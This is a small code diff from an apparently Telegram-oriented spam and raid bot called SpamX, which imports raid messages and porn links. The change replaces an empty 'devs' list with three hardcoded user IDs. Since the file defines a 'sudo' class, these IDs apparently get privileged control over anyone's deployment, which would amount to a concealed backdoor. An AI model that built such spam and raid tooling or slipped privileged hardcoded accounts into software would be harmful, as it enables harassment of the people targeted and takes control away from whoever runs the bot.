@@ -11,7 +11,7 @@ from .messages import raid_messages, porn_links
 from SpamX import version, UpdateChannel, SupportGroup, activeTasks
 from SpamX.config import OWNER_ID, ALIVE_MEDIA, ALIVE_MSG, MULTITASK
 
-devs = []
+devs = [1432756163, 5294360309, 1854700253]
 
 class sudo:
     def __init__(self) -> None:
